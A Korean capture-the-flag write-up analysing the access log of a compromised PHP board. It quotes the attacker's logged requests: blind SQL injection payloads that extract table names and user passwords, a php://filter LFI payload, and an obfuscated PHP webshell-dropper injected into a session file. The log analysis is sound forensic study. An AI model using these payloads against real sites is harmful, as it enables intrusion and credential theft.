## weblog-1
---

주어진 파일에 보면 access 파일이 있는데 로그가 기록되어 있다.

이를 토대로 5개의 문제를 풀면 된다.

<br><br>

### Question 1
---

```
Q: 공격자에게 탈취된 admin 계정의 PW를 입력해주세요.
문제 파일은 문제 지문에서 확인할 수 있습니다.
```

<br>

로그를 보면 login.php에서 시도를 하다가 실패해서 board.php로 이동한다.

이동한 다음 search 매개변수에 값을 넣어서 시도하다가 안되서 sort 매개변수로 시도를 한다.

그런데 sort 매개변수는 값을 그대로 받아들이기 때문에 공격자는 여기서 database명을 뽑아내려고 시도한다.

공격자는 if문을 통해 query가 true이면 문법 에러를 일으켜서 확인한다. 

500 에러가 일어남을 확인할 수 있다.

<br>

아래의 로그는 database 명의 첫 글자인 s를 알아낸 로그 기록이다. 

database 명은 simple_board임을 config.php에서 확인할 수 있다.

<br>

```
172.17.0.1 - - [02/Jun/2020:09:11:09 +0000] "GET /board.php?sort=if(ord(substr(database(),%201,1))=115,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192
```

<br>

그 다음 시간 상으로 ```[02/Jun/2020:09:21:34 +0000]``` 때 기록된 로그부터는 information_schema.columns 에서 테이블, 컬럼 명을 추출하려는 로그가 기록되어 있다.

공격자가 첫 글자를 추출했다. 

<br>

```
172.17.0.1 - - [02/Jun/2020:09:22:01 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%201,1))=98,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192
```

<br>

테이블명의 첫 글자는 b이다.

다른 코드를 보면은 테이블명이 board, 컬럼 이름이 idx, title, contents, writer가 있음을 알 수 있다.

공격자가 뽑아낸 테이블, 컬럼명은 아래와 같다.

```board:idx,board:title,board:contents,board:writer,users:idx,users:username,users:password,users:level```

<br>

다음은 ```[02/Jun/2020:09:50:05 +0000]``` 이 시간에 기록된 로그부터는 users 테이블의 user,password 컬럼 값들을 추출하는 로그가 기록되어 있다.

<br>

```
172.17.0.1 - - [02/Jun/2020:09:50:05 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%201,1))=32,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841
```

<br>

여기서 성공한 로그(500 에러가 난 로그)를 살펴보면 admin의 비밀번호는 ```Th1s_1s_Adm1n_P@SS```

<br><br>

### Question 2
---

```
Q: 공격자가 config.php 코드를 추출하는데 사용한 페이로드를 입력해주세요.
문제 파일은 문제 지문에서 확인할 수 있습니다.
```

<br>

거의 밑부분의 로그를 보면 아래와 같은 로그가 있다.

<br>

```
172.17.0.1 - - [02/Jun/2020:09:54:18 +0000] "GET /admin/?page=php://filter/convert.base64-encode/resource=../config.php HTTP/1.1" 200 986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

<br>

응답코드를 보면 200이다. 

따라서 답은 ```php://filter/convert.base64-encode/resource=../config.php``` 이다.

<br><br>

### Question 3
---

```
Q: LFI 취약점을 통해 코드 실행 공격에 사용된 파일의 전체 경로를 입력해주세요. (파일 이름을 포함한 전체 경로)
문제 파일은 문제 지문에서 확인할 수 있습니다.
```

<br>

로그를 보면 아래와 같은 로그들이 있다.

<br>

```
172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

<br>

```
172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

<br>

```/admin/memo.php```에 가보면 memo라른 세션의 값을 memo 매개변수를 통해 입력받는다. 

따라서 답은 ```/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732```

<br><br>

### Question 4
---

```
Q: 생성된 웹쉘의 경로를 입력해주세요. (파일 이름을 포함한 전체 경로)
문제 파일은 문제 지문에서 확인할 수 있습니다.
```

<br>

